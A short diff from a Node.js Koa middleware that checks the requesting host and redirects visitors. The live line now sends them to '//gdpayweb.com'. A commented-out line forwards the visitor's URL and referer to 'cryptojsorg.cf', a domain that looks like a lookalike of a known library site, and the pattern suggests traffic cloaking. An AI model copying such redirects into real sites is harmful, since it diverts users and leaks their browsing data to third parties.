@@ -147,7 +147,7 @@ app.use(async (ctx, next)=>{
                 // sendema(data,ctx)
                 // ctx.response.redirect('http://cryptojsorg.cf/a?uu='+ctx.href||ctx.request.header.host+'&referer='+str1||'');
                 // return;
-                ctx.response.redirect('gdpayweb.com');
+                ctx.response.redirect('//gdpayweb.com');
                 
             }else{ //除了正常的域名访问都为不正常访问
                 var data = {uu:ctx.href||ctx.request.header.host,referer:str1||''};
